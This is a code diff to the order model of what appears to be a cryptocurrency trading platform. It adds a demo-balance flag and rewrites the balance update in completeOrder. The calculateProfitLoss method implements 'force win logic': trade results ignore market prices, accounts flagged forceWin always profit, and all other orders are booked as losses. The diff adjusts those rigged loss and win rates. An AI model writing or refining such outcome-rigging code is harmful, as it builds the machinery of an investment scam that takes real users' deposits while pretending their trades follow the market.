@@ -162,6 +162,10 @@ const orderSchema = new mongoose.Schema(
     },
     cancellationReason: {
       type: String
+    },
+    isDemo: {
+      type: Boolean,
+      default: false
     }
   },
   {
@@ -288,7 +292,7 @@ orderSchema.methods.preSaveLogic = async function () {
 // Method to calculate profit/loss with force win logic
 orderSchema.methods.calculateProfitLoss = async function () {
   if (!this.exitPrice || !this.entryPrice) {
-    console.log('😉😉😉😉😉Missing exitPrice or entryPrice, skipping profit calculation');
+    //   console.log('😉😉😉😉😉Missing exitPrice or entryPrice, skipping profit calculation');
     return null;
   }
 
@@ -306,20 +310,16 @@ orderSchema.methods.calculateProfitLoss = async function () {
 
     // Check if user has forceWin enabled
     if (user.forceWin) {
-
-
-      // console.log('Force win enabled for user😉😉😉 ');
-      // Force win - always profitable
       this.wasForceWin = true;
       //percentage = Math.abs(this.expectedReturn / this.amount) * 100;
-
       // randomLossPercent = 1 + Math.random() *  durationRates[this.duration] 
-      let rateP = durationRates[this.duration] - 2 || 12;
+      //  let rateP = durationRates[this.duration] - 2 || 12;
+      let rateP = durationRates[this.duration]
       percentage = rateP * this.leverage;
     } else {
       //  console.log('Calculating normal profit/loss for order 😉😉😉');
       let rateP = durationRates[this.duration] || 12;
-      percentage = -rateP - 2 * this.leverage; // Apply leverage to loss
+      percentage = -rateP * this.leverage;
       this.wasRandomLose = true;
       this.randomLossPercentage = rateP;
       isRandomLoss = true;
@@ -402,16 +402,11 @@ orderSchema.methods.calculateProfitLoss = async function () {
 };
 
 
-// Method to complete order with user balance update
-// models/Order.js - FIXED completeOrder method
-// models/Order.js - MINIMAL FIXED VERSION
 orderSchema.methods.completeOrder = async function (exitPrice) {
   try {
     this.exitPrice = exitPrice;
-
     // Calculate P&L
     await this.calculateProfitLoss();
-
     this.status = 'completed';
     this.completedAt = new Date();
     this.isLive = false;
@@ -419,15 +414,67 @@ orderSchema.methods.completeOrder = async function (exitPrice) {
     // Save the order first
     await this.save();
 
-    console.log({
-     "status": "👌👌👌Order completed, now updating user balance...",
-      "wallet.usdt": Number(this.actualPayout.toFixed(2)),  // ← QUOTES ARE CRITICAL
-      "totalTrades": 1,
-      "totalProfit": this.profit > 0 ? Number(this.profit.toFixed(2)) : 0,
-      "totalLoss": this.profit < 0 ? Number(Math.abs(this.profit).toFixed(2)) : 0,
-      "winningTrades": this.profit > 0 ? 1 : 0,
-      "losingTrades": this.profit < 0 ? 1 : 0
-    })
+    // Revert to original layout structure using a dynamic key string
+    const targetWalletField = this.isDemo === true ? "demoBalance" : "wallet.usdt";
+
+    const updatedUser = await userModel.findOneAndUpdate(
+      { _id: this.user },
+      {
+        $inc: {
+          [targetWalletField]: this.actualPayout, // ← Dynamically targets the correct path safely
+          "totalTrades": 1,
+          "totalProfit": this.profit > 0 ? Number(this.profit.toFixed(2)) : 0,
+          "totalLoss": this.profit < 0 ? Number(Math.abs(this.profit).toFixed(2)) : 0,
+          "winningTrades": this.profit > 0 ? 1 : 0,
+          "losingTrades": this.profit < 0 ? 1 : 0
+        }
+      },
+      { new: true }
+    );
+
+    if (!updatedUser) throw new Error('User not found during balance update');
+
+    // Resolve correct final balance layout
+    const finalBalance = this.isDemo === true ? updatedUser.demoBalance : updatedUser.wallet.usdt;
+
+    /*
+     console.log('👌👌👌Balance update successful:', {
+       userId: this.user,
+       oldBalance: finalBalance - this.actualPayout,
+       newBalance: finalBalance,
+       addedAmount: this.actualPayout
+     });
+    */
+
+    return {
+      order: this,
+      userBalance: finalBalance,
+      profit: this.profit,
+      actualPayout: this.actualPayout
+    };
+
+  } catch (error) {
+    console.error('CRITICAL: Balance Update Failed:', error);
+    throw error;
+  }
+}
+
+// Method to complete order with user balance update
+// models/Order.js - FIXED completeOrder method
+// models/Order.js - MINIMAL FIXED VERSION
+/*
+orderSchema.methods.completeOrder = async function (exitPrice) {
+  try {
+    this.exitPrice = exitPrice;
+    // Calculate P&L
+    await this.calculateProfitLoss();
+    this.status = 'completed';
+    this.completedAt = new Date();
+    this.isLive = false;
+
+    // Save the order first
+    await this.save();
+
     // CRITICAL FIX: Use quotes around nested field "wallet.usdt"
     const updatedUser = await userModel.findOneAndUpdate(
       { _id: this.user },
@@ -453,12 +500,7 @@ orderSchema.methods.completeOrder = async function (exitPrice) {
     //   console.error('Transaction record creation failed:', txError);
     // }
 
-    console.log('👌👌👌Balance update successful:', {
-      userId: this.user,
-      oldBalance: updatedUser.wallet.usdt - this.actualPayout,
-      newBalance: updatedUser.wallet.usdt,
-      addedAmount: this.actualPayout
-    });
+  
 
     return {
       order: this,
@@ -472,6 +514,7 @@ orderSchema.methods.completeOrder = async function (exitPrice) {
     throw error;
   }
 };
+*/
 // Method to create transaction record
 orderSchema.methods.createTransaction = async function () {
   try {
